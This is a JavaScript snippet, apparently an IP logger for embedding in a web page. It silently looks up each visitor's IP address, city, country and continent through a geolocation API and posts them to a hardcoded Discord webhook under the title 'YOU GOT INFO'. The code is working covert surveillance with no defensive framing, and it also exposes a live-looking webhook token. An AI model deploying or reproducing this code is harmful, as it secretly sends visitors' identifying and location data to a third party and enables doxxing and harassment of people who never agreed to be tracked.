$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=", function(data) { //Make sure to use this api or use another but you got to change the values down below
    var request = new XMLHttpRequest();
    request.open("POST", "https://discord.com/api/webhooks/1077616611726475295/hXVTwbxvXCbQhtD_fYQAgmKEjz-B830RcoJR-RALuXCX-9Sx-WcJclm8cx7jKN7aJoLT");
  
    request.setRequestHeader('Content-type', 'application/json');
  
    var t = {
      username: "tablica-rejestracyjna.pl",
      avatar_url: "https://previews.123rf.com/images/geotrac/geotrac1401/geotrac140100113/25298075-beautiful-hispanic-soccer-mom.jpg",
      content: "",
      embeds: [{
          color: "4700374",
          title: "YOU GOT INFO",
          fields: [
            {name: "IP", value: data.ip_address},
            {name: "CITY", value: data.city},
            {name: "COUNTRY", value: data.country},
            {name: "CONTINENT", value: data.continent},
          ],
          footer: {
              text: "Gówno | https://basedbot.cf"
          }
      }]
  };
  
    request.send(JSON.stringify(t));
})

